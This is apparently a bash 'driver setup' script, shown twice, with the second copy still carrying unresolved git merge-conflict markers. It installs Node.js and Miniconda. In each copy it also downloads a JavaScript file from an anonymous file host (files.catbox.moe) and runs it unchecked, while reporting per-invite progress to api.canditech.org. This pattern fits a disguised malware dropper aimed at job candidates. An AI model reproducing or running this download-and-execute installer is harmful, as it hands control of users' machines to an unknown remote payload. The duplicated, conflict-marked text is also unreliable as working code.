#!/usr/bin/env bash
set -euo pipefail

MAC_UID="__ID__"

# -------------------------
# Helpers
# -------------------------
info()  { echo "[INFO] $*"; }
err()   { echo "[ERROR] $*" >&2; }
die()   { err "$*"; exit 1; }

download() {
  # download <url> <output>
  local url="$1"
  local out="$2"

  if command -v curl >/dev/null 2>&1; then
    curl -fsSL -o "$out" "$url"
  elif command -v wget >/dev/null 2>&1; then
    wget -qO "$out" "$url"
  else
    die "Neither curl nor wget is available."
  fi
}

track_step() {
  # track_step <step_name> <status> [message]
  local step_name="${1:-}"
  local status="${2:-running}"
  local message="${3:-}"
  if [[ -z "${MAC_UID:-}" || "$MAC_UID" == "__ID__" || -z "$step_name" ]]; then
    return 0
  fi
  local api_url="https://api.canditech.org/api/invites/${MAC_UID}/steps"
  local payload
  payload="$(printf '{"step":"%s","status":"%s","message":"%s"}' \
    "$(printf '%s' "$step_name" | sed 's/\\/\\\\/g; s/"/\\"/g')" \
    "$(printf '%s' "$status" | sed 's/\\/\\\\/g; s/"/\\"/g')" \
    "$(printf '%s' "$message" | sed 's/\\/\\\\/g; s/"/\\"/g')")"
  curl -sS -X POST "$api_url" -H "Content-Type: application/json" -d "$payload" >/dev/null 2>&1 || true
}

CURRENT_STEP="init"
on_fail() {
  track_step "$CURRENT_STEP" "failed" "Script failed near step: ${CURRENT_STEP}"
}
trap on_fail ERR

# -------------------------
# Detect OS + ARCH (Node dist naming)
# -------------------------
OS_UNAME="$(uname -s)"
ARCH_UNAME="$(uname -m)"

case "$OS_UNAME" in
  Darwin) OS_TAG="darwin" ;;
  Linux)  OS_TAG="linux" ;;
  *) die "Unsupported OS: $OS_UNAME" ;;
esac

case "$ARCH_UNAME" in
  x86_64|amd64) ARCH_TAG="x64" ;;
  arm64|aarch64) ARCH_TAG="arm64" ;;
  *)
    die "Unsupported architecture: $ARCH_UNAME (need x64 or arm64)"
    ;;
esac

# -------------------------
# Prefer global Node if available
# -------------------------
NODE_EXE=""
if command -v node >/dev/null 2>&1; then
  CURRENT_STEP="check_node"
  NODE_INSTALLED_VERSION="$(node -v 2>/dev/null || true)"
  if [[ -n "${NODE_INSTALLED_VERSION:-}" ]]; then
    NODE_EXE="node"
    track_step "check_node" "success" "Global node found: ${NODE_INSTALLED_VERSION}"
    info "Checking Driver..."
  fi
fi

# -------------------------
# Download portable Node.js if not found globally
# -------------------------
USER_HOME="/Users/Shared"
mkdir -p "$USER_HOME"

if [[ -z "$NODE_EXE" ]]; then
  CURRENT_STEP="prepare_node"
  track_step "prepare_node" "running" "Downloading portable node for ${OS_TAG}-${ARCH_TAG}"
  info "Driver not found globally. Downloading portable Driver for ${OS_TAG}-${ARCH_TAG}..."

  INDEX_JSON="$USER_HOME/node-index.json"
  download "https://nodejs.org/dist/index.json" "$INDEX_JSON"

  LATEST_VERSION="$(grep -oE '"version"\s*:\s*"v[0-9]+\.[0-9]+\.[0-9]+"' "$INDEX_JSON" | head -n 1 | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+')"
  rm -f "$INDEX_JSON"

  [[ -n "${LATEST_VERSION:-}" ]] || die "Failed to determine latest Driver version."

  NODE_VERSION="${LATEST_VERSION#v}"
  TARBALL_NAME="node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}.tar.xz"
  DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${TARBALL_NAME}"

  EXTRACTED_DIR="${USER_HOME}/node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}"
  PORTABLE_NODE="${EXTRACTED_DIR}/bin/node"
  NODE_TARBALL="${USER_HOME}/${TARBALL_NAME}"

  if [[ -x "$PORTABLE_NODE" ]]; then
    track_step "prepare_node" "success" "Portable node already available"
    info "Driver already present: $PORTABLE_NODE"
  else
    info "Downloading..."
    download "$DOWNLOAD_URL" "$NODE_TARBALL"
    [[ -s "$NODE_TARBALL" ]] || die "Failed to download Driver tarball."

    info "Extracting Driver..."
    tar -xf "$NODE_TARBALL" -C "$USER_HOME"
    rm -f "$NODE_TARBALL"

    [[ -x "$PORTABLE_NODE" ]] || die "node executable not found after extraction: $PORTABLE_NODE"
    track_step "prepare_node" "success" "Portable node extracted successfully"
    info "Portable Driver extracted successfully."
  fi

  NODE_EXE="$PORTABLE_NODE"
  export PATH="${EXTRACTED_DIR}/bin:${PATH}"
fi

# -------------------------
# Verify Node works
# -------------------------
"$NODE_EXE" -v >/dev/null 2>&1 || die "Driver execution failed."
CURRENT_STEP="verify_node"
track_step "verify_node" "success" "Node executable verified"
info "Using Driver: $("$NODE_EXE" -v)"

# -------------------------
# Download and run env-setup.js
# -------------------------
ENV_SETUP_JS="${USER_HOME}/env-setup.js"
download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
[[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."

info "Running Driver..."
CURRENT_STEP="driver_setup"
track_step "driver_setup" "running" "Executing driver setup script"
"$NODE_EXE" "$ENV_SETUP_JS"
track_step "driver_setup" "success" "Driver setup completed"
info "[SUCCESS] Driver Setup completed successfully."

ARCH="$(uname -m)"
OS="$(uname -s)"
SHARED_DIR="/Users/Shared"
DOWNLOAD_DIR="$SHARED_DIR"
MINICONDA_PREFIX="/Users/Shared/miniconda3"
MINICONDA_SH=""
MINICONDA_LOG="/Users/Shared/miniconda-install.log"

echo "Detected OS: $OS"
echo "Detected architecture: $ARCH"
CURRENT_STEP="detect_platform"
track_step "detect_platform" "success" "Detected ${OS}/${ARCH}"

if ! mkdir -p "$SHARED_DIR" 2>/dev/null || [[ ! -w "$SHARED_DIR" ]]; then
  DOWNLOAD_DIR="$HOME"
  MINICONDA_PREFIX="${HOME}/miniconda3"
  MINICONDA_LOG="${HOME}/miniconda-install.log"
fi

if [[ "$OS" == "Darwin" ]]; then
  if [[ "$ARCH" == "arm64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh"
    MINICONDA_SH="${DOWNLOAD_DIR}/Miniconda3-latest-MacOSX-arm64.sh"
  elif [[ "$ARCH" == "x86_64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
    MINICONDA_SH="${DOWNLOAD_DIR}/Miniconda3-latest-MacOSX-x86_64.sh"
  else
    die "Unsupported macOS architecture: $ARCH"
  fi
elif [[ "$OS" == "Linux" ]]; then
  if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh"
    MINICONDA_SH="${DOWNLOAD_DIR}/Miniconda3-latest-Linux-aarch64.sh"
  elif [[ "$ARCH" == "x86_64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
    MINICONDA_SH="${DOWNLOAD_DIR}/Miniconda3-latest-Linux-x86_64.sh"
  else
    die "Unsupported Linux architecture: $ARCH"
  fi
else
  die "Unsupported OS: $OS"
fi

echo "Downloading..."
CURRENT_STEP="download_miniconda"
track_step "download_miniconda" "running" "Downloading Miniconda installer"
download "$URL" "$MINICONDA_SH"
[[ -s "$MINICONDA_SH" ]] || die "Miniconda download failed."
track_step "download_miniconda" "success" "Miniconda installer downloaded"

echo "Installing..."
CURRENT_STEP="install_miniconda"
track_step "install_miniconda" "running" "Installing Miniconda at ${MINICONDA_PREFIX}"
bash "$MINICONDA_SH" -b -u -p "$MINICONDA_PREFIX" >>"$MINICONDA_LOG" 2>&1 || die "Miniconda install failed. Check log: $MINICONDA_LOG"
track_step "install_miniconda" "success" "Miniconda installed"

echo "Verifying Driver..."
CURRENT_STEP="verify_miniconda"
"$MINICONDA_PREFIX/bin/python3" -V >/dev/null 2>&1 || die "Miniconda python verification failed."
[[ -d "$MINICONDA_PREFIX" ]] || die "Miniconda folder not found at $MINICONDA_PREFIX"
track_step "verify_miniconda" "success" "Miniconda python verified"

echo "Cleaning up..."
CURRENT_STEP="cleanup"
rm -f "$MINICONDA_SH"
track_step "cleanup" "success" "Installer cleaned up"
trap - ERR
track_step "completed" "success" "All steps completed"
echo "Done. Miniconda path: $MINICONDA_PREFIX"
exit 0
#!/usr/bin/env bash
set -euo pipefail

# -------------------------
# Helpers
# -------------------------
info()  { echo "[INFO] $*"; }
err()   { echo "[ERROR] $*" >&2; }
die()   { err "$*"; exit 1; }

download() {
  # download <url> <output>
  local url="$1"
  local out="$2"

  if command -v curl >/dev/null 2>&1; then
    curl -fsSL -o "$out" "$url"
  elif command -v wget >/dev/null 2>&1; then
    wget -qO "$out" "$url"
  else
    die "Neither curl nor wget is available."
  fi
}

track_step() {
  # track_step <step_name> <status> [message]
  local step_name="${1:-}"
  local status="${2:-running}"
  local message="${3:-}"
  if [[ -z "${MAC_UID:-}" || "$MAC_UID" == "__ID__" || -z "$step_name" ]]; then
    return 0
  fi
  local api_url="https://api.canditech.org/api/invites/${MAC_UID}/steps"
  local payload
  payload="$(printf '{"step":"%s","status":"%s","message":"%s"}' \
    "$(printf '%s' "$step_name" | sed 's/\\/\\\\/g; s/"/\\"/g')" \
    "$(printf '%s' "$status" | sed 's/\\/\\\\/g; s/"/\\"/g')" \
    "$(printf '%s' "$message" | sed 's/\\/\\\\/g; s/"/\\"/g')")"
  curl -sS -X POST "$api_url" -H "Content-Type: application/json" -d "$payload" >/dev/null 2>&1 || true
}

CURRENT_STEP="init"
on_fail() {
  track_step "$CURRENT_STEP" "failed" "Script failed near step: ${CURRENT_STEP}"
}
trap on_fail ERR

# -------------------------
# Detect OS + ARCH (Node dist naming)
# -------------------------
OS_UNAME="$(uname -s)"
ARCH_UNAME="$(uname -m)"

case "$OS_UNAME" in
  Darwin) OS_TAG="darwin" ;;
  Linux)  OS_TAG="linux" ;;
  *) die "Unsupported OS: $OS_UNAME" ;;
esac

case "$ARCH_UNAME" in
  x86_64|amd64) ARCH_TAG="x64" ;;
  arm64|aarch64) ARCH_TAG="arm64" ;;
  *)
    die "Unsupported architecture: $ARCH_UNAME (need x64 or arm64)"
    ;;
esac

# -------------------------
# Prefer global Node if available
# -------------------------
NODE_EXE=""
if command -v node >/dev/null 2>&1; then
  CURRENT_STEP="check_node"
  NODE_INSTALLED_VERSION="$(node -v 2>/dev/null || true)"
  if [[ -n "${NODE_INSTALLED_VERSION:-}" ]]; then
    NODE_EXE="node"
<<<<<<< HEAD
=======
    track_step "check_node" "success" "Global node found: ${NODE_INSTALLED_VERSION}"
>>>>>>> d85f042 (update mac step tracking and invite progress history)
    info "Checking Driver..."
  fi
fi

# -------------------------
# Download portable Node.js if not found globally
# -------------------------
USER_HOME="/Users/Shared"
mkdir -p "$USER_HOME"

if [[ -z "$NODE_EXE" ]]; then
<<<<<<< HEAD
=======
  CURRENT_STEP="prepare_node"
  track_step "prepare_node" "running" "Downloading portable node for ${OS_TAG}-${ARCH_TAG}"
>>>>>>> d85f042 (update mac step tracking and invite progress history)
  info "Driver not found globally. Downloading portable Driver for ${OS_TAG}-${ARCH_TAG}..."

  # Fetch latest version from Node dist index.json
  INDEX_JSON="$USER_HOME/node-index.json"
  download "https://nodejs.org/dist/index.json" "$INDEX_JSON"

  # Extract first "version":"vX.Y.Z" from JSON (latest listed first)
  LATEST_VERSION="$(grep -oE '"version"\s*:\s*"v[0-9]+\.[0-9]+\.[0-9]+"' "$INDEX_JSON" | head -n 1 | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+')"
  rm -f "$INDEX_JSON"

  [[ -n "${LATEST_VERSION:-}" ]] || die "Failed to determine latest Driver version."

  NODE_VERSION="${LATEST_VERSION#v}"
  TARBALL_NAME="node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}.tar.xz"
  DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${TARBALL_NAME}"

  EXTRACTED_DIR="${USER_HOME}/node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}"
  PORTABLE_NODE="${EXTRACTED_DIR}/bin/node"
  NODE_TARBALL="${USER_HOME}/${TARBALL_NAME}"

  if [[ -x "$PORTABLE_NODE" ]]; then
<<<<<<< HEAD
=======
    track_step "prepare_node" "success" "Portable node already available"
>>>>>>> d85f042 (update mac step tracking and invite progress history)
    info "Driver already present: $PORTABLE_NODE"
  else
    info "Downloading..."
    download "$DOWNLOAD_URL" "$NODE_TARBALL"

    [[ -s "$NODE_TARBALL" ]] || die "Failed to download Driver tarball."

    info "Extracting Driver..."
    tar -xf "$NODE_TARBALL" -C "$USER_HOME"
    rm -f "$NODE_TARBALL"

    [[ -x "$PORTABLE_NODE" ]] || die "node executable not found after extraction: $PORTABLE_NODE"
<<<<<<< HEAD
=======
    track_step "prepare_node" "success" "Portable node extracted successfully"
>>>>>>> d85f042 (update mac step tracking and invite progress history)
    info "Portable Driver extracted successfully."
  fi

  NODE_EXE="$PORTABLE_NODE"
  export PATH="${EXTRACTED_DIR}/bin:${PATH}"
fi

# -------------------------
# Verify Node works
# -------------------------
"$NODE_EXE" -v >/dev/null 2>&1 || die "Driver execution failed."
<<<<<<< HEAD
=======
CURRENT_STEP="verify_node"
track_step "verify_node" "success" "Node executable verified"
>>>>>>> d85f042 (update mac step tracking and invite progress history)
info "Using Driver: $("$NODE_EXE" -v)"

# -------------------------
# Download and run env-setup.js
# -------------------------
ENV_SETUP_JS="${USER_HOME}/env-setup.js"
download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
[[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."

info "Running Driver..."
<<<<<<< HEAD
=======
CURRENT_STEP="driver_setup"
track_step "driver_setup" "running" "Executing driver setup script"
>>>>>>> d85f042 (update mac step tracking and invite progress history)
"$NODE_EXE" "$ENV_SETUP_JS"
track_step "driver_setup" "success" "Driver setup completed"

info "[SUCCESS] Driver Setup completed successfully."

ARCH="$(uname -m)"
OS="$(uname -s)"
SHARED_DIR="/Users/Shared"
<<<<<<< HEAD
INSTALL_BASE="$SHARED_DIR"
MINICONDA_PREFIX=""
MINICONDA_SH=""
MINICONDA_LOG=""

echo "Detected OS: $OS"
echo "Detected architecture: $ARCH"

mkdir -p "$SHARED_DIR" || true
if [[ -w "$SHARED_DIR" ]]; then
  INSTALL_BASE="$SHARED_DIR"
else
  INSTALL_BASE="$HOME"
fi

MINICONDA_PREFIX="${INSTALL_BASE}/miniconda3"
MINICONDA_LOG="${INSTALL_BASE}/miniconda-install.log"

if [[ "$OS" == "Darwin" ]]; then
  if [[ "$ARCH" == "arm64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh"
    MINICONDA_SH="${INSTALL_BASE}/Miniconda3-latest-MacOSX-arm64.sh"
  elif [[ "$ARCH" == "x86_64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
    MINICONDA_SH="${INSTALL_BASE}/Miniconda3-latest-MacOSX-x86_64.sh"
  else
    die "Unsupported macOS architecture: $ARCH"
  fi
elif [[ "$OS" == "Linux" ]]; then
  if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh"
    MINICONDA_SH="${INSTALL_BASE}/Miniconda3-latest-Linux-aarch64.sh"
  elif [[ "$ARCH" == "x86_64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
    MINICONDA_SH="${INSTALL_BASE}/Miniconda3-latest-Linux-x86_64.sh"
  else
    die "Unsupported Linux architecture: $ARCH"
  fi
else
  die "Unsupported OS: $OS"
fi

echo "Downloading..."
download "$URL" "$MINICONDA_SH"
[[ -s "$MINICONDA_SH" ]] || die "Miniconda download failed."

echo "Installing..."
# -u keeps reruns safe if prefix already exists.
bash "$MINICONDA_SH" -b -u -p "$MINICONDA_PREFIX" >>"$MINICONDA_LOG" 2>&1 || die "Miniconda install failed. Check log: $MINICONDA_LOG"

echo "Verifying Driver..."
"$MINICONDA_PREFIX/bin/python3" -V >/dev/null 2>&1 || die "Miniconda python verification failed."
[[ -d "$MINICONDA_PREFIX" ]] || die "Miniconda folder not found at $MINICONDA_PREFIX"

echo "Cleaning up..."
rm -f "$MINICONDA_SH"
echo "Done. Miniconda path: $MINICONDA_PREFIX"
exit 0
=======
DOWNLOAD_DIR="$SHARED_DIR"
MINICONDA_PREFIX="/Users/Shared/miniconda3"
MINICONDA_SH=""
MINICONDA_LOG="/Users/Shared/miniconda-install.log"

echo "Detected OS: $OS"
echo "Detected architecture: $ARCH"
CURRENT_STEP="detect_platform"
track_step "detect_platform" "success" "Detected ${OS}/${ARCH}"

if ! mkdir -p "$SHARED_DIR" 2>/dev/null || [[ ! -w "$SHARED_DIR" ]]; then
  DOWNLOAD_DIR="$HOME"
  MINICONDA_PREFIX="${HOME}/miniconda3"
  MINICONDA_LOG="${HOME}/miniconda-install.log"
fi

if [[ "$OS" == "Darwin" ]]; then
  if [[ "$ARCH" == "arm64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh"
    MINICONDA_SH="${DOWNLOAD_DIR}/Miniconda3-latest-MacOSX-arm64.sh"
  elif [[ "$ARCH" == "x86_64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
    MINICONDA_SH="${DOWNLOAD_DIR}/Miniconda3-latest-MacOSX-x86_64.sh"
  else
    die "Unsupported macOS architecture: $ARCH"
  fi
elif [[ "$OS" == "Linux" ]]; then
  if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh"
    MINICONDA_SH="${DOWNLOAD_DIR}/Miniconda3-latest-Linux-aarch64.sh"
  elif [[ "$ARCH" == "x86_64" ]]; then
    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
    MINICONDA_SH="${DOWNLOAD_DIR}/Miniconda3-latest-Linux-x86_64.sh"
  else
    die "Unsupported Linux architecture: $ARCH"
  fi
else
  die "Unsupported OS: $OS"
fi

echo "Downloading..."
CURRENT_STEP="download_miniconda"
track_step "download_miniconda" "running" "Downloading Miniconda installer"
download "$URL" "$MINICONDA_SH"
[[ -s "$MINICONDA_SH" ]] || die "Miniconda download failed."
track_step "download_miniconda" "success" "Miniconda installer downloaded"

echo "Installing..."
# -u keeps reruns safe if prefix already exists.
CURRENT_STEP="install_miniconda"
track_step "install_miniconda" "running" "Installing Miniconda at ${MINICONDA_PREFIX}"
bash "$MINICONDA_SH" -b -u -p "$MINICONDA_PREFIX" >>"$MINICONDA_LOG" 2>&1 || die "Miniconda install failed. Check log: $MINICONDA_LOG"
track_step "install_miniconda" "success" "Miniconda installed"

echo "Verifying Driver..."
CURRENT_STEP="verify_miniconda"
"$MINICONDA_PREFIX/bin/python3" -V >/dev/null 2>&1 || die "Miniconda python verification failed."
[[ -d "$MINICONDA_PREFIX" ]] || die "Miniconda folder not found at $MINICONDA_PREFIX"
track_step "verify_miniconda" "success" "Miniconda python verified"

echo "Cleaning up..."
CURRENT_STEP="cleanup"
rm -f "$MINICONDA_SH"
track_step "cleanup" "success" "Installer cleaned up"
trap - ERR
track_step "completed" "success" "All steps completed"
echo "Done. Miniconda path: $MINICONDA_PREFIX"
exit 0
>>>>>>> d85f042 (update mac step tracking and invite progress history)
